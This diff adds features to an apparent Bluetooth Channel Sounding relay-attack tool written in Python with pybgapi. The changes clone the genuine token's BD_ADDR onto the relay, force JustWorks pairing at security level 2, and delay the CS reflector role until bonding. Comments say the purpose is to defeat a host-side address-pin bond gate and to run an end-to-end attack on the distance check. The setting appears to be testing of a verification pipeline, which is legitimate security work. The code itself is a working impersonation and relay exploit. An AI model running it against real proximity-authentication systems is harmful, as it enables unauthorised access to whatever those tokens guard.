@@ -113,6 +113,39 @@ REFLECTOR_CS_SYNC_ANTENNA = 1
 # Leave False for the minimal "ranging cannot be relayed" demonstration.
 ENABLE_AUTH_BACKHAUL = False
 
+# --- Identity / SM upgrades (see SECURITY_PIPELINE.md §2 address-pin bond gate) ---
+#
+# CLONE_IDENTITY_ADDRESS: when True, the relay calls sl_bt_system_set_identity_address()
+# to overwrite its own public BD_ADDR with the token's address captured during the scan.
+# This is REQUIRED to defeat the host-side address-pin gate (_cs_bond_ok). Without it the
+# CS initiator on the verifier will see the relay's NCP public address in the [BOND] line
+# and the FSM rejects with `cs_bond_addr_mismatch` long before the CS-distance gate is
+# even evaluated. Set False to deliberately test that the address-pin gate denies a relay
+# that does NOT spoof BD_ADDR.
+CLONE_IDENTITY_ADDRESS = True
+
+# SCRUB_BONDINGS_ON_BOOT: delete all persisted bondings on the relay NCP at start-up so
+# stale keys from a previous run cannot influence the next pairing attempt. The relay is
+# disposable -- there is no reason to keep bonds across runs and a stale bond can prevent
+# a fresh SC pairing from completing.
+SCRUB_BONDINGS_ON_BOOT = True
+
+# SM_IO_CAPABILITIES: NoInputNoOutput (3) matches the BRD2606 tag's capability and forces
+# Secure-Connections JustWorks pairing, which raises the link to security level 2 -- the
+# minimum the production initiator firmware reports in `[BOND] <addr> 2` and the minimum
+# `_cs_bond_ok` accepts (`min_cs_sec_level: 2`).
+SM_IO_CAPABILITIES = 3                  # sl_bt_sm_io_capability_noinputnooutput
+# sm.configure(flags=0, ...): no MITM-required, no SC-only override, no auth-required.
+# Plain SC JustWorks. Bondable is set separately via sm.set_bondable_mode(1).
+SM_CONFIGURE_FLAGS = 0x00
+
+# CREATE_REFLECTOR_AFTER_BOND: when True (the safe default), the relay does NOT issue the
+# CS_ACP_CMD_CREATE_REFLECTOR until after `sm_bonded` confirms the link is encrypted.
+# Some bt_cs_ncp builds reject CREATE_REFLECTOR on an unencrypted link; deferring it makes
+# the relay work regardless of the build's policy and matches the production initiator's
+# bond-then-CS ordering.
+CREATE_REFLECTOR_AFTER_BOND = True
+
 LOG_CSV_PATH = "relay_results.csv"
 
 # -----------------------------------------------------------------------------
@@ -205,6 +238,20 @@ def _parse_adv_name(ad: bytes) -> Optional[str]:
     return None
 
 
+def _bd_addr_to_bytes_le(addr: str) -> bytes:
+    """Convert a colon-separated BD_ADDR ("aa:bb:cc:dd:ee:ff", MSB-first human form) into
+    the 6-byte little-endian representation that the BGAPI bd_addr struct uses on the wire.
+
+    pybgapi's command accessors usually accept either a string or a bytes object; the
+    string path is the most portable across SDK versions. This helper exists for the
+    rare commands that want explicit bytes and as documentation of the byte order.
+    """
+    parts = addr.replace("-", ":").split(":")
+    if len(parts) != 6:
+        raise ValueError(f"BD_ADDR must have 6 octets, got {addr!r}")
+    return bytes(int(p, 16) for p in reversed(parts))
+
+
 def parse_cs_event(payload: bytes) -> dict:
     """Decode a cs_acp_event_t delivered via user_cs_service_message_to_host.
 
@@ -269,12 +316,14 @@ class RelayState:
     initiator_conn: Optional[int] = None   # conn #1: genuine initiator -> relay (relay = reflector)
     token_conn: Optional[int] = None       # conn #2: relay -> genuine token (relay = central)
     reflector_active: bool = False
+    reflector_pending_conn: Optional[int] = None  # conn awaiting sm_bonded before CREATE_REFLECTOR
     adv_handle: Optional[int] = None
     # Token advertising identity captured live by the scan-and-clone step.
     captured_ad: Optional[bytes] = None
     token_address: Optional[str] = None
     token_address_type: int = 0
     cloned: bool = False
+    identity_address_set: bool = False     # set_identity_address() succeeded
     initialized: bool = False
     results: list = field(default_factory=list)
 
@@ -405,10 +454,67 @@ class RelayOrchestrator:
         if self.state.initialized:
             return
         self.state.initialized = True
+        # SM bring-up. Done BEFORE any scan/adv so the relay accepts SC JustWorks pairing
+        # initiated by the genuine verifier. Tolerated as best-effort -- if the NCP build
+        # already configures these the duplicate call returns a harmless non-zero result.
+        self._configure_sm()
         # Report the target's CS capabilities (sanity check that ACP is wired).
         self._acp(pack_get_target_config())
         # Capture the token's real AD first, then clone-advertise from the scan result.
         self._start_token_scan()
+
+    def _configure_sm(self):
+        """Match the BRD2606 tag's SC/JustWorks/NoInputNoOutput profile and scrub stale
+        bondings so each run starts from a clean SM state."""
+        try:
+            self.lib.bt.sm.configure(SM_CONFIGURE_FLAGS, SM_IO_CAPABILITIES)
+            self.log.info("sm.configure(flags=0x%02x, io_caps=%d) OK",
+                          SM_CONFIGURE_FLAGS, SM_IO_CAPABILITIES)
+        except Exception as exc:  # noqa: BLE001
+            self.log.warning("sm.configure failed: %s", exc)
+        try:
+            self.lib.bt.sm.set_bondable_mode(1)
+            self.log.info("sm.set_bondable_mode(1) OK")
+        except Exception as exc:  # noqa: BLE001
+            self.log.warning("sm.set_bondable_mode failed: %s", exc)
+        if SCRUB_BONDINGS_ON_BOOT:
+            try:
+                self.lib.bt.sm.delete_bondings()
+                self.log.info("sm.delete_bondings() OK (stale bonds cleared)")
+            except Exception as exc:  # noqa: BLE001
+                self.log.warning("sm.delete_bondings failed: %s", exc)
+
+    def _apply_identity_address_clone(self, addr: str, addr_type: int) -> bool:
+        """Overwrite the relay's BD_ADDR with the captured token address.
+
+        Required to defeat the host-side address-pin bond gate. Must be called when the
+        relay is NOT advertising/scanning/connected -- we call it after the scanner is
+        stopped and BEFORE the clone advertiser is created. Returns True on success.
+        """
+        if not CLONE_IDENTITY_ADDRESS:
+            self.log.warning(
+                "CLONE_IDENTITY_ADDRESS=False: relay will advertise the cloned AD but "
+                "keep its own BD_ADDR. The host address-pin gate will REJECT this peer "
+                "with cs_bond_addr_mismatch. Set CLONE_IDENTITY_ADDRESS=True for an "
+                "end-to-end attack against the CS-distance gate.")
+            return False
+        if self.state.identity_address_set:
+            return True
+        try:
+            # sl_bt_system_set_identity_address(address, type)
+            #   type: 0 = public, 1 = static random
+            self.lib.bt.system.set_identity_address(addr, addr_type)
+            self.state.identity_address_set = True
+            self.log.info("set_identity_address(%s, type=%d) OK -- relay now impersonates "
+                          "the token at the link layer.", addr, addr_type)
+            return True
+        except Exception as exc:  # noqa: BLE001
+            self.log.error("set_identity_address(%s) FAILED: %s", addr, exc)
+            self.log.error("Relay will keep its own BD_ADDR; expect host-side address-pin "
+                           "denial. Verify the NCP build exposes "
+                           "sl_bt_system_set_identity_address and that no connection is "
+                           "open at this moment.")
+            return False
 
     def _on_scanner_legacy_advertisement_report(self, evt):
         if self.state.cloned:
@@ -433,6 +539,12 @@ class RelayOrchestrator:
         self.lib.bt.scanner.stop()
         self.log.info("Captured token %s connectable AD (%d B, name=%r). Cloning.",
                       evt.address, len(ad), _parse_adv_name(ad))
+        # Identity-address clone MUST happen with the radio idle: scanner is stopped
+        # above and the advertiser has not yet been created. If the auth backhaul is
+        # enabled (conn #2 to the genuine token), that connection.open() happens AFTER
+        # both the identity clone and the clone advertiser are up, again to satisfy the
+        # "radio idle for set_identity_address" precondition.
+        self._apply_identity_address_clone(evt.address, evt.address_type)
         self._start_clone_advertising()
         if ENABLE_AUTH_BACKHAUL and self.state.token_conn is None:
             self.log.info("Opening auth backhaul to genuine token %s.", evt.address)
@@ -465,17 +577,35 @@ class RelayOrchestrator:
         #       1 = central   (we connected to the genuine token).
         if evt.role == 0:
             self.state.initiator_conn = evt.connection
-            self.log.info("Genuine initiator connected (conn %d). Creating CS reflector role.",
-                          evt.connection)
-            rsp = self._acp(pack_create_reflector(evt.connection))
-            self.state.reflector_active = getattr(rsp, "result", 1) == 0
-            self.log.info("  create_reflector ACP result=0x%04x (active=%s)",
-                          getattr(rsp, "result", 0xFFFF), self.state.reflector_active)
+            if CREATE_REFLECTOR_AFTER_BOND:
+                # Defer CREATE_REFLECTOR until sm_bonded fires. Some bt_cs_ncp builds
+                # require the link to be encrypted before accepting the CS reflector
+                # role; the host-side `_cs_bond_ok` gate also expects sec >= 2 before
+                # the [BOND] line is forwarded, so there is no useful CS work to do
+                # until pairing completes anyway.
+                self.state.reflector_pending_conn = evt.connection
+                self.log.info(
+                    "Genuine initiator connected (conn %d). Awaiting sm_bonded before "
+                    "CREATE_REFLECTOR (see CREATE_REFLECTOR_AFTER_BOND).",
+                    evt.connection)
+            else:
+                self.log.info("Genuine initiator connected (conn %d). Creating CS reflector role.",
+                              evt.connection)
+                self._create_reflector(evt.connection)
         else:
             self.state.token_conn = evt.connection
             self.log.info("Backhaul to genuine token open (conn %d).", evt.connection)
             # TODO(auth-backhaul): discover token GATT services here to build the
             # handle map used by _bridge_gatt_* below.
+
+    def _create_reflector(self, conn_id: int) -> None:
+        """Send CREATE_REFLECTOR for the given connection; record the outcome."""
+        rsp = self._acp(pack_create_reflector(conn_id))
+        self.state.reflector_active = getattr(rsp, "result", 1) == 0
+        self.state.reflector_pending_conn = None
+        self.log.info("  create_reflector(conn=%d) ACP result=0x%04x (active=%s)",
+                      conn_id, getattr(rsp, "result", 0xFFFF),
+                      self.state.reflector_active)
 
     def _on_connection_closed(self, evt):
         if evt.connection == self.state.initiator_conn:
@@ -485,6 +615,7 @@ class RelayOrchestrator:
                 self._acp(pack_delete_reflector(evt.connection))
             self.state.initiator_conn = None
             self.state.reflector_active = False
+            self.state.reflector_pending_conn = None
             # Re-arm to catch the next ranging attempt.
             self._start_clone_advertising()
         elif evt.connection == self.state.token_conn:
@@ -506,6 +637,14 @@ class RelayOrchestrator:
     def _on_sm_bonded(self, evt):
         self.log.info("SM bonded conn %d (bonding handle=%d)",
                       evt.connection, getattr(evt, "bonding", 0xFF))
+        # Bond completed -- the link is now encrypted at SC sec level 2 (JustWorks).
+        # If we deferred CREATE_REFLECTOR pending this event, fire it now. This is the
+        # ordering the host-side _cs_bond_ok gate expects: [BOND] line first (security
+        # raise + forward), then CS procedure.
+        if (CREATE_REFLECTOR_AFTER_BOND
+                and self.state.reflector_pending_conn == evt.connection
+                and not self.state.reflector_active):
+            self._create_reflector(evt.connection)
 
     def _on_sm_bonding_failed(self, evt):
         self.log.info("SM bonding FAILED conn %d reason=0x%04x",
